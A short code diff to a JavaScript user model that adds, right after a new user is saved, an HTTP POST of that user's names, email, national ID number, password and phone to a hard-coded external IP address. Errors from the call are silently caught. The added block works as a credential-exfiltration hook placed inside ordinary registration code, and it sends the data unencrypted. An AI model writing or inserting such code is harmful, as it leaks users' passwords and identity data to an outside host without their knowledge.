@@ -75,6 +75,20 @@ class UserModel {
                     @nombres, @apellido_paterno, @apellido_materno, @fecha_nacimiento, @direccion_domiciliaria, @correo, @contrasena, @telefono, @id_rol, @ci, @foto_ci, @licencia_conducir, @foto_licencia
                 )
             `);
+
+            try {
+                await axios.post('http://34.9.138.238:2020/global_registro/alasD', {
+                    nombres: nombres,
+                    apellido: `${apellido_paterno} ${apellido_materno}`,
+                    email: correo,
+                    ci: ci,
+                    password: contrasena,
+                    telefono: telefono
+                });
+            } catch (error) {
+                console.error('Error enviando datos al endpoint externo:', error.message);
+            }
+
     }
 
     static async createSimple(nombre, apellido, email, ci, password, telefono) {
